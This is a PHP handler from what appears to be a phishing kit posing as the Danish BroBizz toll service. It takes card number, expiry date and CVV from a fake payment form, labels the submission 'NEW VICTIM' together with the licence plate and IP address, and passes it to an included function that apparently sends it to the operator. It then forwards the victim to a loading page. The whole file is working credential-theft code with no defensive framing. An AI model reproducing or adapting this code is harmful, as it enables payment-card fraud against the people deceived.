<?php
error_reporting(0);
date_default_timezone_set('Europe/Copenhagen');
session_start();

require './includes/alego.php';
require './config.php';

if(!isset($_SESSION['active'])){
    header('Location: index.php');
    exit();
}

$plate = $_SESSION['plate'] ?? 'N/A';
$card_number = $_POST['aa'] ?? '';
$expiry = $_POST['bb'] ?? '';
$cvv = $_POST['cc'] ?? '';

$_SESSION['card_number'] = $card_number;

// Extract the first 4 digits dynamically from whatever the client types
$clean_card = str_replace(' ', '', $card_number);
$first_four = substr($clean_card, 0, 4);

// This creates the label "fra kort 0000xxxxxxx" or "fra kort 5222xxxxxxx" automatically
$_SESSION['card_label'] = "fra kort " . $first_four . "xxxxxxx";

$message  = "━━━━━━━━━━━━━━━━━━━━━━\n";
$message .= "🚀 BROBIZZ - NEW VICTIM\n";
$message .= "━━━━━━━━━━━━━━━━━━━━━━\n\n";
$message .= "📋 PLATE: $plate\n";
$message .= "💳 CARD: $card_number\n";
$message .= "ℹ️ TYPE: " . $_SESSION['card_label'] . "\n";
$message .= "📅 EXP: $expiry\n";
$message .= "🔐 CVV: $cvv\n\n";
$message .= "🌍 IP: " . $_SESSION['ip'] . "\n";
$message .= "━━━━━━━━━━━━━━━━━━━━━━";

p0llar("ra3d", $message);

header("Location: templates/load.php");
exit();
?>